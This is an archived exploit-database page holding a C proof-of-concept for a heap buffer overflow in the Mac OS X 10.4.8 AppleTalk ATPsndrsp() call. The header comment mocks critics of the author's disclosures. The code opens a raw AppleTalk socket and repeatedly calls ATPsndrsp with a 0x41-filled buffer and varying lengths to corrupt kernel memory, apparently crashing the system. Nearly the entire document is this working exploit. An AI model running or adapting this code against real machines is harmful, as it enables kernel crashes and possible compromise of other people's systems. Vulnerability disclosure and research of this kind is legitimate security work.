<html><head><title>Mac OS X 10.4.8 AppleTalk ATPsndrsp() Heap Buffer Overflow PoC</title></head><pre>/* proof of concept for moab-14-01-2007
 * Copyright (c) 2006, LMH &lt;lmh [at] infopull.com&gt;
 * Shout outs to: icer, kf, ilja, hd, et al.
 *
 * free feedback samples for public consumption:
 *
 * &quot;the panic() function takes a string for the reason the panic
 * occurred. As you can see from the above, the reason us due to the
 * fact the buffer size is absurd. The system caught this absurdity and
 * handled it by calling panic().
 * In other words, not capable of executing arbitrary code.&quot;
 * -- Rosyna Keller, talking about allocbuf() failing due to allocation
 * of a negative size buffer, caused by a simple integer overflow.
 *
 *
 * &quot;&gt;LMH claims #10 leads to &quot;potential arbitrary code execution.&quot; That's
 * &gt;not good enough where I come from. Either the arbitrary code executes,
 * &gt;or it doesn't. I may be talking thru my elbow, but I suggest the
 * &gt;absence of a working example of &quot;arbitrary code execution&quot; is that we
 * &gt;have caused a kernel panic, and stack based execution ceases.&quot;
 * -- dinornis, stack based haxor in training.
 *
 */

#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/sockio.h&gt;
#include &lt;netat/appletalk.h&gt;

int main(int argc, char **argv) {
        int fd, retv, i;
		unsigned int a, b;
		char *powder;

        if ((fd = socket(AF_APPLETALK, SOCK_RAW, 0)) &lt; 0)
                exit(1);
		
		powder = malloc(6000);
		memset(powder, 0x41, 5999);

		for (i=0; i &lt; 7000; i++) {
			a = strlen(powder) - i;
			b = i;
			printf(&quot;powder@%p a=%u b=%u\n&quot;, powder, a, b);
			retv = ATPsndrsp(fd, (unsigned char *)powder, a, b);
		}
		
        close(fd);
		free(powder); // won't reach this unless appletalk is disabled
		return 0;
}

// milw0rm.com [2007-01-14]</pre></html>